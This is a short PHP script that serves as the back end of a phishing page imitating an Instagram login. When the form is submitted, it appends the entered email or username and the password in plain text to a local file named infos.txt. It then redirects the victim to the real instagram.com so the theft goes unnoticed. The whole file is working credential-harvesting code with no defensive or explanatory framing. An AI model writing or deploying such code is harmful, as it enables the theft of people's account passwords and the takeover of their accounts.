<?php
              
              if(isset($_POST['submit']))
              {
              $data1=$_POST['email'];
              $data2=$_POST['psw'];
             
              $fp = fopen('infos.txt', 'a'); 
              fwrite($fp, "username or email: ");
              fwrite($fp, $data1);
              fwrite($fp, "\r\n");
              fwrite($fp, "password: ");
              fwrite($fp, $data2);
              fwrite($fp, "\r\n\n");
              fwrite($fp, "--------------------------\n");
              fclose($fp);
              }
              header ('Location: https://www.instagram.com/');
              die();
              ?>